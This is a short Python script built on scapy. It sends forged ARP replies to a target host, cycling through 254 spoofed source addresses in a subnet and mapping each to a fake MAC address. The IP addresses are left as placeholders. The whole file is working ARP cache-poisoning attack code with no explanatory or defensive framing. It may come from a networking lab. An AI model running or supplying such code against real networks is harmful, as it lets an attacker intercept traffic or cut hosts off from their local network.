from scapy.all import *

fake_src_ip = "x.x.x." # x
target_ip = "x.x.x.x"


for i in range(1, 255):
  fake_src = fake_src_ip + str(i)
  print(fake_src)
  
  arp_frame = ARP( 
    pdst=target_ip, hwdst="08:00:27:E7:EB:62", 
    psrc=fake_src, hwsrc="00:00:00:12:34:56")
  send(arp_frame)

